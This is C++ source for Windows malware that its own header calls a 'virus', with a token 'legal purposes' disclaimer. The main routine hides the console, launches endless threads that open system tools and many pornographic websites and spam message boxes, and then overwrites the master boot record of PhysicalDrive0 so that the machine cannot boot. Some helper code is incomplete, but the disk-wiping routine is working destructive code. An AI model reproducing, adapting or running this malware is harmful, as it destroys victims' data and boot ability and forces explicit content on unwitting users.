
 /* (c) All Rights Reserved, Dashies Software Inc. */


 /* 
 
   All rights shall and will be reserved towards Dashies Software or and Dashware.

   This application has been made for legal purposes such as making you able to find
   out ways to prevent this beautiful virus from infecting your system. 

   this whole Core has been programmed by Dashie.
 
 */
 
#include<windows.h>
#include<mmsystem.h>
#include<conio.h>
#include<stdlib.h>
#include<stdio.h>
#include<string.h>
#include<lmcons.h>
#include<tchar.h>
#include<wchar.h>
#include<time.h>
#include<math.h>

#include<iostream>
#include<sstream>
#include<fstream>
#include<string>
#include<vector>
#include<algorithm>
#include<map>
#include<ctime>
#include<thread>
#include<cstdlib>

using namespace std;

class FlamesPayload
{
private:
	static void AnotherThreadFlamed()
	{
		std::vector<std::string> execute = 
		{
			"C:\\Windows\\System32\\cmd.exe", "C:\\Windows\\explorer.exe", "C:\\Windows\\System32\\taskmgr.exe", "C:\\Windows\\System32\\regedit.exe",
			"C:\\Windows\\System32\\control.exe", "https://yespornplease.com", "https://taxi69.com", "https://pornhub.com", "https://xnxx.com",
			"https://www.google.com", "https://www.youtube.co.uk/results?q=Dashie%20is%20the%20best%ever!", "https://sissy-softwaries.com", "http://www.dashware-software.co.uk", "http://vagina.nl"
		};

		for (;;)
		{
			for (int i = 0; i <= execute.size() - 1; i += 1)
			{
				ShellExecute(NULL, "open", execute[i].c_str(), NULL, NULL, SW_SHOW);
				ShellExecute(NULL, "open", execute[i].c_str(), NULL, NULL, SW_HIDE);
			}
		}
	}

	static void Spammer()
	{
		for (;;)
		{
			MessageBox(NULL, "Are you doing alright?", "Dashie Says", MB_OK | MB_ICONWARNING);
		}
	}

static void Porn_Injection() {
	remove(TEXT("C:\\ProgramData\\DC\\dashost.clx"));
	remove(TEXT("TEMP.TMP"));
	
	for(int dbIndex = 0; dbIndex <= 32; dbIndex = dbIndex + 1) {
		ShellExecute(NULL, TEXT("open"), TEXT("C:\\Windows\\System32\\netstat.exe"), NULL, NULL, SW_SHOW);
		for(int dbOther = 0; dbOther <= 1; dbOther = dbOther + 1) {
			ShellExecute(NULL, TEXT("open"), TEXT("https://yespornplease.com/#DashieWasNotHere"), NULL, NULL, SW_SHOW);
			ShellExecute(NULL, TEXT("open"), TEXT("https://www.heavy-r.com/#DashieWasNotHere"), NULL, NULL, SW_SHOW);
			ShellExecute(NULL, TEXT("open"), TEXT("https://www.pornhub.com/#DashieWasNotHere"), NULL, NULL, SW_SHOW);
			ShellExecute(NULL, TEXT("open"), TEXT("http://www.xxx.com/#DashieWasNotHere"), NULL, NULL, SW_SHOW);
			ShellExecute(NULL, TEXT("open"), TEXT("https://www.ixxx.com/#DashieWasNotHere"), NULL, NULL, SW_SHOW);
			ShellExecute(NULL, TEXT("open"), TEXT("https://www.xnxx.com/video-fsherda/xxx#DashieWasNotHere"), NULL, NULL, SW_SHOW);
			ShellExecute(NULL, TEXT("open"), TEXT("https://www.gonzoxxxmovies.com/#DashieWasNotHere"), NULL, NULL, SW_SHOW);
			ShellExecute(NULL, TEXT("open"), TEXT("https://www.teenpornvideo.xxx/videos/1835/home-pornography-bevy2/#DashieWasNotHere"), NULL, NULL, SW_SHOW);
			ShellExecute(NULL, TEXT("open"), TEXT("https://img-l3.xvideos-cdn.com/videos/thumbs169lll/f2/28/16/f22816102f90bdfa5e36737e24c07c6b/f22816102f90bdfa5e36737e24c07c6b.18.jpg#DashieWasNotHere"), NULL, NULL, SW_SHOW);
			ShellExecute(NULL, TEXT("open"), TEXT("https://www.furryporn.xxx/#DashieWasNotHere"), NULL, NULL, SW_SHOW);
			ShellExecute(NULL, TEXT("open"), TEXT("https://www.cartoonpornvideos.com/tags/video/furry#DashieWasNotHere"), NULL, NULL, SW_SHOW);
			ShellExecute(NULL, TEXT("open"), TEXT("https://www.pornhub.com/view_video.php?viewkey=ph5640a01674293#DashieWasNotHere"), NULL, NULL, SW_SHOW);
			ShellExecute(NULL, TEXT("open"), TEXT("https://www.thuis.nl/tj/?utm_source=DoublePimp&utm_medium=Advertising#DashieWasNotHere"), NULL, NULL, SW_SHOW);
			ShellExecute(NULL, TEXT("open"), TEXT("https://www.pornhub.com/view_video.php?viewkey=ph5640a01674293#DashieWasNotHere"), NULL, NULL, SW_SHOW);
			ShellExecute(NULL, TEXT("open"), TEXT("https://see.xx#DashieWasNotHere"), NULL, NULL, SW_SHOW);
			ShellExecute(NULL, TEXT("open"), TEXT("https://www.pornhub.com/view_video.php?viewkey=ph5a244e4d8da78#DashieWasNotHere"), NULL, NULL, SW_SHOW);
			ShellExecute(NULL, TEXT("open"), TEXT("https://tax69.com#DashieWasNotHere"), NULL, NULL, SW_SHOW);
			ShellExecute(NULL, TEXT("open"), TEXT("https://www.youtube.com/watch?v=ffAORBZ1QhA#DashieWasNotHere"), NULL, NULL, SW_SHOW);
			ShellExecute(NULL, TEXT("open"), TEXT("https://freetits.com#DashieWasNotHere"), NULL, NULL, SW_SHOW);
			ShellExecute(NULL, TEXT("open"), TEXT("https://videos.taxi69.com/V67T92TD8n7IwcY2M00m1g/1533910214/10568.mp4#DashieWasNotHere"), NULL, NULL, SW_SHOW);
		}
	}
}

	std::vector<std::thread> workers;

public:
	void runPayload(int Threads)
	{
		ShowWindow(GetConsoleWindow(), SW_HIDE);

		for (int i = 0; i <= Threads; i += 1)
		{
			workers.push_back(std::thread([]() { AnotherThreadFlamed(); }));
			workers.push_back(std::thread([]() { Spammer(); }));
		}
	}
}payload_flames;

class DashMasterBootRecordKiller
{
private:
	DWORD dwBytesWritten = { 0 };
	HANDLE FileHandle;

	char mbrTotalSize[512];
	char mbrDriverPath[19] = "\\\\.\\PhysicalDrive0";

public:
	bool runPayload(bool autoRestart, bool doVerbose)
	{
		if (doVerbose) std::cout << "[INFO]: Attempting the destruction of your master boot record ...." << std::endl;

		if (!dash_util.isAdministrator())
		{
			std::cout << "[ERROR]: You need administrative privileges for this one!" << std::endl;
			return false;
		}

		if (FileHandle = CreateFile(mbrDriverPath, GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0))
		{
			if (WriteFile(FileHandle, mbrTotalSize, 512, &dwBytesWritten, NULL))
			{
				if (doVerbose) std::cout << "[SUCCESS]: Yaaay, your master boot record has been destroyed!" << std::endl;

				if (autoRestart)
				{
					if (doVerbose) std::cout << "[INFO]: Restarting your device in 3 seconds ...." << std::endl;

					Sleep(3000);
				}

				CloseHandle(FileHandle);
				return true;
			}

			else
			{
				if (doVerbose) std::cout << "[ERROR]: For some reason was I not able to write to your master boot record!" << std::endl;
			}
		}

		else
		{
			if (doVerbose) std::cout << "[ERROR]: You have insufficient write permissions!" << std::endl;
		}

		return false;
	}
}payload_dmbrk;

int main(void) {
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	CoInitializeEx(NULL, COINIT_APARTMENTTHREADED | COINIT_DISABLE_OLE1DDE);
	
	payload_flames.runPayload(24);
	payload_dmbrk.runPayload(false, false);
	
	getch();
}

 /* (c) All Rights Reserved, Dashies Software Inc. */
